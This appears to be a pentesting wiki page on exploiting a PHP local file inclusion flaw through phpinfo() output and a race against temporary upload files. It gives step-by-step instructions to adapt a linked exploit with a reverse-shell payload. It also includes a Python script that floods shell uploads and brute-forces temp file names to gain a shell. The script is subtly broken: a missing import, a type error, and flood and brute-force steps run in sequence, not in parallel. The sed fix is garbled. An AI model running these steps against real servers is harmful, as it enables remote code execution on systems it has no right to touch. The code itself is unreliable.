To exploit this vulnerability you need: **A LFI vulnerability, a page where phpinfo() is displayed, "file\_uploads = on" and the server has to be able to write in the "/tmp" directory.**

[https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

You need to fix the exploit (change **=>** for **=>**). To do so you can do:

```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```

You have to change also the **payload** at the beginning of the exploit (for a php-rev-shell for example), the **REQ1** (this should point to the phpinfo page and should have the padding included, i.e.: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), and **LFIREQ** (this should point to the LFI vulnerability, i.e.: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Check the double "%" when exploiting null char)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Theory

If uploads are allowed in PHP and you try to upload a file, this files is stored in a temporal directory until the server has finished processing the request, then this temporary files is deleted.

Then, if have found a LFI vulnerability in the web server you can try to guess the name of the temporary file created and exploit a RCE accessing the temporary file before it is deleted.

In **Windows** the files are usually stored in **C:\Windows\temp\php<<**

In **linux** the name of the file use to be **random** and located in **/tmp**. As the name is random, it is needed to **extract from somewhere the name of the temporal file** and access it before it is deleted. This can be done reading the value of the **variable $\_FILES** inside the content of the function "**phpconfig()**".

**phpinfo()**

**PHP** uses a buffer of **4096B** and when it is **full**, it is **send to the client**. Then the client can **send** **a lot of big requests** (using big headers) **uploading a php** reverse **shell**, wait for the **first part of the phpinfo() to be returned** (where the name of the temporary file is) and try to **access the temp file** before the php server deletes the file exploiting a LFI vulnerability.

**Python script to try to bruteforce the name (if length = 6)**

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```
